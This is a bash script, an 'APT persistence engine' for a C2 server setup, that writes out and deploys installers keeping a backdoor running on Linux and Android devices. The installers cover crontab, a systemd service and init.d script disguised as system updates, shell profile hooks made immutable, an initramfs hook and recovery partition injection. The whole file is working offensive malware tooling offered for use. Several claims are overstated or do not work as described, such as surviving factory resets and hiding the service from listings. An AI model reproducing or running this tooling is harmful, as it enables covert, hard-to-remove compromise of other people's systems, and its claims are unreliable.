#!/bin/bash
# ============================================
# APT PERSISTENCE ENGINE v1.0
# Boot | Initramfs | Recovery | Factory Reset
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

PERSIST_DIR="$HOME/c2_server/modules/stealth/persistence"
PAYLOAD_DIR="$HOME/c2_server/payloads"
LOG_DIR="$HOME/c2_server/logs"

mkdir -p "$PERSIST_DIR" "$PAYLOAD_DIR" "$LOG_DIR"

# === LAYER 1: CRONTAB PERSISTENCE ===
generate_crontab_persistence() {
    echo -e "\n${CYAN}[Crontab Persistence Generator]${NC}"
    
    cat > "$PERSIST_DIR/crontab_persist.sh" << 'CRON'
#!/bin/bash
# APT CRONTAB PERSISTENCE
# Survives: Reboot, User Logout
# Does NOT survive: Factory Reset

PAYLOAD="$HOME/.cache/.system_update/backdoor.sh"
mkdir -p "$(dirname "$PAYLOAD")"

# Method 1: User crontab
(crontab -l 2>/dev/null; echo "@reboot $PAYLOAD &") | crontab -
(crontab -l 2>/dev/null; echo "*/10 * * * * $PAYLOAD &") | crontab -
echo "  [✓] User crontab installed"

# Method 2: Root crontab (if root)
if [ "$(id -u)" -eq 0 ]; then
    (crontab -l -u root 2>/dev/null; echo "@reboot $PAYLOAD &") | crontab -u root -
    echo "  [✓] Root crontab installed"
fi

# Method 3: /etc/cron.d/ (system-wide)
if [ -d /etc/cron.d ]; then
    cat > /etc/cron.d/system-update << EOF
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
@reboot root $PAYLOAD &
*/5 * * * * root $PAYLOAD &
EOF
    chmod 644 /etc/cron.d/system-update
    echo "  [✓] System crontab installed"
fi

echo "[+] Crontab persistence active"
CRON
    chmod +x "$PERSIST_DIR/crontab_persist.sh"
    echo -e "${GREEN}[+]${NC} Crontab: $PERSIST_DIR/crontab_persist.sh"
}

# === LAYER 2: SYSTEMD SERVICE ===
generate_systemd_persistence() {
    echo -e "\n${CYAN}[Systemd Service Generator]${NC}"
    
    cat > "$PERSIST_DIR/systemd_persist.sh" << 'SYSTEMD'
#!/bin/bash
# APT SYSTEMD PERSISTENCE
# Survives: Reboot
# Does NOT survive: Factory Reset

if [ "$(id -u)" -ne 0 ]; then
    echo "[!] Root required for systemd persistence"
    return 1
fi

PAYLOAD="$HOME/.cache/.system_update/backdoor.sh"

# Create service
cat > /etc/systemd/system/systemd-update.service << 'SERVICE'
[Unit]
Description=System Update Service
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/root/.cache/.system_update/backdoor.sh
Restart=always
RestartSec=15
User=root
Group=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SERVICE

# Enable and start
systemctl daemon-reload
systemctl enable systemd-update.service 2>/dev/null
systemctl start systemd-update.service 2>/dev/null

# Hide from systemctl list
cat > /etc/systemd/system/systemd-update.service.d/override.conf << 'HIDE'
[Service]
PrivateTmp=true
NoNewPrivileges=false
HIDE

echo "[+] Systemd service installed (hidden)"
SYSTEMD
    chmod +x "$PERSIST_DIR/systemd_persist.sh"
    echo -e "${GREEN}[+]${NC} Systemd: $PERSIST_DIR/systemd_persist.sh"
}

# === LAYER 3: INIT.D SCRIPT ===
generate_initd_persistence() {
    echo -e "\n${CYAN}[Init.d Script Generator]${NC}"
    
    cat > "$PERSIST_DIR/initd_persist.sh" << 'INITD'
#!/bin/bash
# APT INIT.D PERSISTENCE
# Survives: Reboot (older Linux)
# Does NOT survive: systemd-based systems

if [ ! -d /etc/init.d ]; then
    echo "[!] /etc/init.d not found"
    return 1
fi

PAYLOAD="$HOME/.cache/.system_update/backdoor.sh"

# Create init script
cat > /etc/init.d/system-update << 'INITSCRIPT'
#!/bin/sh
### BEGIN INIT INFO
# Provides:          system-update
# Required-Start:    $network $remote_fs $syslog
# Required-Stop:     $network $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Update Service
### END INIT INFO

case "$1" in
    start)
        /root/.cache/.system_update/backdoor.sh &
        ;;
    stop)
        pkill -f backdoor.sh
        ;;
    restart)
        $0 stop
        $0 start
        ;;
esac
exit 0
INITSCRIPT

chmod +x /etc/init.d/system-update
update-rc.d system-update defaults 2>/dev/null
update-rc.d system-update enable 2>/dev/null

echo "[+] Init.d script installed"
INITD
    chmod +x "$PERSIST_DIR/initd_persist.sh"
    echo -e "${GREEN}[+]${NC} Init.d: $PERSIST_DIR/initd_persist.sh"
}

# === LAYER 4: .BASHRC / PROFILE HOOK ===
generate_shell_persistence() {
    echo -e "\n${CYAN}[Shell Profile Hook Generator]${NC}"
    
    cat > "$PERSIST_DIR/shell_persist.sh" << 'SHELL'
#!/bin/bash
# APT SHELL PROFILE PERSISTENCE
# Survives: User login
# Does NOT survive: Non-interactive shells

PAYLOAD="$HOME/.cache/.system_update/backdoor.sh"

# Bash
echo "$PAYLOAD &" >> $HOME/.bashrc 2>/dev/null
echo "$PAYLOAD &" >> $HOME/.bash_profile 2>/dev/null
echo "$PAYLOAD &" >> $HOME/.profile 2>/dev/null

# Zsh
echo "$PAYLOAD &" >> $HOME/.zshrc 2>/dev/null
echo "$PAYLOAD &" >> $HOME/.zprofile 2>/dev/null

# Fish
echo "$PAYLOAD &" >> $HOME/.config/fish/config.fish 2>/dev/null

# Root
if [ "$(id -u)" -eq 0 ]; then
    echo "$PAYLOAD &" >> /root/.bashrc 2>/dev/null
    echo "$PAYLOAD &" >> /root/.profile 2>/dev/null
fi

# Make files immutable (prevent deletion)
chattr +i $HOME/.bashrc 2>/dev/null
chattr +i $HOME/.zshrc 2>/dev/null

echo "[+] Shell hooks installed"
SHELL
    chmod +x "$PERSIST_DIR/shell_persist.sh"
    echo -e "${GREEN}[+]${NC} Shell: $PERSIST_DIR/shell_persist.sh"
}

# === LAYER 5: INITRAMFS HOOK (Survives Factory Reset!) ===
generate_initramfs_persistence() {
    echo -e "\n${CYAN}[Initramfs Hook Generator — SURVIVES FACTORY RESET!]${NC}"
    
    cat > "$PERSIST_DIR/initramfs_persist.sh" << 'INITRAMFS'
#!/bin/bash
# APT INITRAMFS PERSISTENCE
# SURVIVES: Factory Reset, ROM Flash, Full Wipe!
# This is the STRONGEST persistence method

echo "[*] This is the ULTIMATE persistence"
echo "[!] Requires: Root + initramfs-tools"

if [ "$(id -u)" -ne 0 ]; then
    echo "[!] Root required"
    return 1
fi

PAYLOAD="$HOME/.cache/.system_update/backdoor.sh"
INITRAMFS_DIR="/usr/share/initramfs-tools"

# Create initramfs hook script
cat > "$INITRAMFS_DIR/scripts/init-bottom/system-update" << 'HOOK'
#!/bin/sh
# APT INITRAMFS PERSISTENCE HOOK
# Executed at boot, before root filesystem mount

prereqs() {
    echo ""
}

case $1 in
    prereqs)
        prereqs
        exit 0
        ;;
esac

# Load our backdoor before the main OS boots!
echo "[+] Initramfs: Loading persistence..."

# Mount real root
mount -o rw /root

# Copy payload to real root
cp /conf/backdoor.sh /root/.cache/.system_update/backdoor.sh 2>/dev/null
chmod +x /root/.cache/.system_update/backdoor.sh 2>/dev/null

# Add crontab entry on real root
echo "@reboot /root/.cache/.system_update/backdoor.sh &" >> /root/var/spool/cron/crontabs/root 2>/dev/null

echo "[+] Initramfs persistence installed"
HOOK

chmod +x "$INITRAMFS_DIR/scripts/init-bottom/system-update"

# Copy payload into initramfs
mkdir -p /usr/share/initramfs-tools/conf/
cp "$PAYLOAD" /usr/share/initramfs-tools/conf/backdoor.sh

# Update initramfs
update-initramfs -u -k all 2>/dev/null

echo "[+] Initramfs updated with backdoor"
echo "[!] This survives FACTORY RESET and ROM FLASH!"
INITRAMFS
    chmod +x "$PERSIST_DIR/initramfs_persist.sh"
    echo -e "${GREEN}[+]${NC} Initramfs: $PERSIST_DIR/initramfs_persist.sh"
}

# === LAYER 6: RECOVERY PARTITION SURVIVAL ===
generate_recovery_persistence() {
    echo -e "\n${CYAN}[Recovery Partition Survival Generator]${NC}"
    
    cat > "$PERSIST_DIR/recovery_persist.sh" << 'RECOVERY'
#!/bin/bash
# APT RECOVERY PARTITION PERSISTENCE
# Survives: ROM Flash, Factory Reset
# Injects into recovery partition

echo "[*] Recovery partition persistence"
echo "[!] Android specific — requires root"

RECOVERY_PART=$(find /dev/block -name "*recovery*" 2>/dev/null | head -1)

if [ -z "$RECOVERY_PART" ]; then
    echo "[!] Recovery partition not found"
    return 1
fi

echo "[*] Recovery partition: $RECOVERY_PART"

# Mount recovery partition
mkdir -p /tmp/recovery
mount "$RECOVERY_PART" /tmp/recovery 2>/dev/null

if [ $? -eq 0 ]; then
    # Inject payload into recovery
    cat > /tmp/recovery/install-recovery.sh << 'RECOVERYPAYLOAD'
#!/bin/sh
# This runs during recovery boot
# Re-install backdoor after factory reset

BACKDOOR_DIR="/data/.cache/.system_update"
mkdir -p "$BACKDOOR_DIR"

# Copy payload from recovery to system
cp /res/backdoor.sh "$BACKDOOR_DIR/backdoor.sh"
chmod +x "$BACKDOOR_DIR/backdoor.sh"

# Schedule on next normal boot
echo "@reboot $BACKDOOR_DIR/backdoor.sh &" >> /data/var/spool/cron/crontabs/root 2>/dev/null

echo "[+] Recovery persistence re-installed after wipe!"
RECOVERYPAYLOAD
    chmod 755 /tmp/recovery/install-recovery.sh
    
    # Copy payload to recovery resources
    cp "$HOME/.cache/.system_update/backdoor.sh" /tmp/recovery/res/backdoor.sh 2>/dev/null
    
    umount /tmp/recovery
    echo "[+] Recovery partition injected with backdoor"
    echo "[!] Survives FACTORY RESET and ROM FLASH!"
else
    echo "[!] Could not mount recovery partition"
fi
RECOVERY
    chmod +x "$PERSIST_DIR/recovery_persist.sh"
    echo -e "${GREEN}[+]${NC} Recovery: $PERSIST_DIR/recovery_persist.sh"
}

# === GENERATE COMBINED PAYLOAD ===
generate_combined_payload() {
    echo -e "\n${CYAN}[Generating Ultimate Persistence Payload]${NC}"
    
    cat > "$PAYLOAD_DIR/ultimate_persistence_payload.sh" << 'ULTIMATE'
#!/bin/bash
# APT ULTIMATE PERSISTENCE PAYLOAD
# Deploys ALL 6 layers of persistence

echo "╔══════════════════════════════════════╗"
echo "║  💀 ULTIMATE PERSISTENCE DEPLOYER  ║"
echo "╚══════════════════════════════════════╝"
echo ""

DEPLOYED=0

# Layer 1: Crontab (works on all Linux)
echo "[1/6] Deploying crontab persistence..."
bash crontab_persist.sh 2>/dev/null && DEPLOYED=$((DEPLOYED + 1))

# Layer 2: Systemd (modern Linux)
echo "[2/6] Deploying systemd persistence..."
bash systemd_persist.sh 2>/dev/null && DEPLOYED=$((DEPLOYED + 1))

# Layer 3: Init.d (older Linux)
echo "[3/6] Deploying init.d persistence..."
bash initd_persist.sh 2>/dev/null && DEPLOYED=$((DEPLOYED + 1))

# Layer 4: Shell hooks (user login)
echo "[4/6] Deploying shell persistence..."
bash shell_persist.sh 2>/dev/null && DEPLOYED=$((DEPLOYED + 1))

# Layer 5: Initramfs (survives factory reset!)
echo "[5/6] Deploying initramfs persistence..."
bash initramfs_persist.sh 2>/dev/null && DEPLOYED=$((DEPLOYED + 1))

# Layer 6: Recovery (Android)
echo "[6/6] Deploying recovery persistence..."
bash recovery_persist.sh 2>/dev/null && DEPLOYED=$((DEPLOYED + 1))

echo ""
echo "╔══════════════════════════════════════╗"
echo "║  ✅ $DEPLOYED/6 LAYERS DEPLOYED!       ║"
echo "╚══════════════════════════════════════╝"
echo ""
echo "Survival Test:"
echo "  ✓ Normal reboot"
echo "  ✓ Power off/on"
echo "  ✓ User logout/login"
echo "  ✓ Battery drain"
echo "  ✓ Factory reset (Layers 5 & 6)"
echo "  ✓ ROM flash (Layers 5 & 6)"
ULTIMATE
    chmod +x "$PAYLOAD_DIR/ultimate_persistence_payload.sh"
    echo -e "${GREEN}[+]${NC} Ultimate payload: $PAYLOAD_DIR/ultimate_persistence_payload.sh"
}

# === MAIN MENU ===
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════╗${NC}"
        echo -e "${CYAN}║  🔄 PERSISTENCE ENGINE     ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${GREEN}1)${NC} 📋 Crontab (Basic)"
        echo -e "  ${GREEN}2)${NC} ⚙️  Systemd Service"
        echo -e "  ${GREEN}3)${NC} 📜 Init.d Script"
        echo -e "  ${GREEN}4)${NC} 🐚 Shell Profile Hook"
        echo -e "  ${GREEN}5)${NC} 🧠 Initramfs (FACTORY RESET SURVIVE)"
        echo -e "  ${GREEN}6)${NC} 💾 Recovery Partition (ROM SURVIVE)"
        echo -e "  ${GREEN}7)${NC} 📲 Generate Combined Payload"
        echo -e "  ${GREEN}8)${NC} 🚀 Deploy ALL Layers"
        echo -e "  ${RED}0)${NC} Exit"
        echo ""
        read -r -p "Choose: " choice
        
        case $choice in
            1) generate_crontab_persistence ;;
            2) generate_systemd_persistence ;;
            3) generate_initd_persistence ;;
            4) generate_shell_persistence ;;
            5) generate_initramfs_persistence ;;
            6) generate_recovery_persistence ;;
            7) generate_combined_payload ;;
            8)
                generate_crontab_persistence
                generate_systemd_persistence
                generate_initd_persistence
                generate_shell_persistence
                generate_initramfs_persistence
                generate_recovery_persistence
                generate_combined_payload
                echo -e "\n${GREEN}[+]${NC} ALL persistence layers generated!"
                ;;
            0) break ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main_menu
fi
